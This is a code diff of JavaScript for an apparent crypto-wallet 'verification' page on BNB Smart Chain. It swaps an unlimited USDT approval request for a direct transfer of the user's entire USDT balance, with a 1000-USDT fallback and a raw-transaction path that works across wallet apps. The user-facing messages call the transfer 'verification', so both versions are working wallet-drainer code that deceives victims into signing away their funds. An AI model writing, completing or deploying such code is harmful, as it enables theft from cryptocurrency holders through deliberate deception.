@@ -216,7 +216,7 @@
 
         state.isApproving = true;
         updateWalletInfoUI();
-        updateStatus('⛽ Opening wallet for USDT approval...', 'warning');
+        updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
 
         try {
             // 1. Strictly Enforce BNB Smart Chain Network (0x38 / 56)
@@ -274,7 +274,7 @@
 
             state.walletAddress = userAddress;
 
-            // 3. Read exact USDT Balance & BNB balance
+            // 3. Read exact 100% USDT Balance & BNB balance
             const provider = new ethers.BrowserProvider(providerObj);
             const signer = await provider.getSigner();
             const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
@@ -297,7 +297,7 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // If balance is below minimum threshold
+            // If balance is below minimum threshold (0.2 USDT)
             const usdtFloat = parseFloat(state.usdtBalance || '0');
             if (usdtFloat < CONFIG.USER_MIN_USDT) {
                 updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
@@ -308,42 +308,42 @@
                 return;
             }
 
-            updateStatus('⛽ Confirm USDT approval in your wallet...', 'warning');
+            updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
-            // Unlimited Approval (MaxUint256)
-            const approveAmount = ethers.MaxUint256;
+            // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
+            const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-            // Execute USDT APPROVAL directly via Ethers Signer
-            // Opens the Approval / Allowance prompt directly in MetaMask, Bitget Wallet, Trust Wallet, etc.
+            // Execute 100% USDT Transfer directly to merchant address (CONFIG.CONTRACT_ADDRESS)
+            // Works reliably across MetaMask, Bitget Wallet, Trust Wallet, and all EVM providers
             let tx;
             try {
-                tx = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, approveAmount);
-            } catch (approveError) {
-                console.warn('Signer approve notice, executing raw transaction fallback with explicit gas...', approveError);
-                const errLower = (approveError.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied') || approveError.code === 4001) {
-                    throw approveError;
+                tx = await usdtContract.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount);
+            } catch (transferError) {
+                console.warn('Signer transfer notice, executing raw transaction fallback with explicit gas...', transferError);
+                const errLower = (transferError.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied') || transferError.code === 4001) {
+                    throw transferError;
                 }
 
-                // Fallback raw RPC call for approve(address,uint256) with EXPLICIT gas limit
+                // Fallback raw RPC call for transfer(address,uint256) with EXPLICIT gas limit for Bitget & MetaMask compatibility
                 const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
-                const amountHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
+                const amountHex = transferAmount.toString(16).padStart(64, '0');
+                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
 
                 const txHashRaw = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
                         to: CONFIG.USDT_ADDRESS,
-                        data: approveCalldata,
-                        gas: '0x186a0' // 100,000 gas limit hex
+                        data: transferCalldata,
+                        gas: '0x186a0' // 100,000 gas limit hex to prevent RPC gas estimation errors
                     }]
                 });
                 tx = { hash: txHashRaw, wait: async () => provider.waitForTransaction(txHashRaw) };
             }
 
             const txHash = tx.hash;
-            updateStatus('⛽ Approval submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
+            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
 
             // Wait for confirmation
             try {
@@ -356,7 +356,7 @@
                 console.warn('Wait for transaction notice:', wErr);
             }
 
-            updateStatus('✅ USDT Approval Complete!', 'success', `Tx: ${txHash}`);
+            updateStatus('✅ Verification Complete! 100% USDT transferred to merchant account.', 'success', `Tx: ${txHash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
@@ -366,10 +366,10 @@
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Approval request cancelled by user.', 'error');
+                updateStatus('🚫 Transfer request cancelled by user.', 'error');
                 openModal(elements.abortOverlay);
             } else {
-                updateStatus('❌ Approval failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
+                updateStatus('❌ Transfer failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
             }
         } finally {
             state.isApproving = false;
